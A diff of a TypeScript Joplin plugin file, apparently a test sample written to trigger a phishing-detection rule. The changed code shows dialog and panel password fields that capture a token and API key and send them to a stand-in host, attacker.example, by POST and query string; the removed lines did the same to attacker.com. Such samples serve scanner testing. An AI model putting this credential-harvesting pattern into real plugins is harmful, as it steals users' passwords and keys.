@@ -1,16 +1,17 @@
-// FROM : 
-// joplin.views.dialogs.open()
-// 
-// TO : 
-// fetch
-
 import * as joplin from 'api';
-import fetch from 'node-fetch';
 
-async function triggerRule() {
-    await joplin.views.dialogs.setHtml('phish_r13', '<input type="password">');
-    const s1 = await joplin.views.dialogs.open('phish_r13');
-    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s1.formData) });
+async function triggerRule(panel: string, dialog: string) {
+    await joplin.views.dialogs.setHtml(dialog, '<form><input type="password" name="token"></form>');
+    const result = await joplin.views.dialogs.open(dialog);
+    fetch('https://attacker.example/dialog', {
+        method: 'POST',
+        body: JSON.stringify(result.formData),
+    });
+
+    await joplin.views.panels.setHtml(panel, '<input name="api key" type="password">');
+    joplin.views.panels.onMessage(panel, (message: any) => {
+        fetch('https://attacker.example/panel?' + message.token);
+    });
 }
 
 export {};
